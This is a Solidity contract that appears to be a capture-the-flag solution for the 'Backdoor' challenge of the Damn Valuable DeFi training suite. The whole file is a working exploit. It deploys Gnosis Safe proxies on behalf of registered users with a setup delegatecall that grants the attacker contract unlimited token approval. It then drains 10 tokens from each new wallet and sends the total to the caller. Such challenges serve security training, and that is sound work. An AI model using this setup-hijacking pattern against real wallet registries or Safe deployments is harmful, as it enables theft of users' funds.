// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "../DamnValuableToken.sol";

import "hardhat/console.sol";

contract AttackBackdoor {
    DamnValuableToken token;
    WalletRegistry registry;
    address masterCopy;
    GnosisSafeProxyFactory proxyCreation;

    constructor(
        address _token,
        address _registry,
        address _proxyCreation,
        address _wallet
    ) {
        token = DamnValuableToken(_token);
        registry = WalletRegistry(_registry);
        masterCopy = _wallet;
        proxyCreation = GnosisSafeProxyFactory(_proxyCreation);
    }

    function approve(address sender, address tokenAddress) public {
        IERC20(tokenAddress).approve(sender, type(uint256).max);
    }

    function attack(address[] calldata _users) public {
        for (uint256 i = 0; i < _users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = _users[i];
            bytes memory encodeApprove = abi.encodeWithSignature(
                "approve(address,address)",
                address(this),
                address(token)
            );
            bytes memory initialiser = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                encodeApprove,
                address(0),
                0,
                0,
                0
            );
            GnosisSafeProxy proxy = proxyCreation.createProxyWithCallback(
                masterCopy,
                initialiser,
                0,
                IProxyCreationCallback(address(registry))
            );

            token.transferFrom(address(proxy), address(this), 10 ether);
            console.log(token.balanceOf(address(this)) / 1 ether);
        }
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
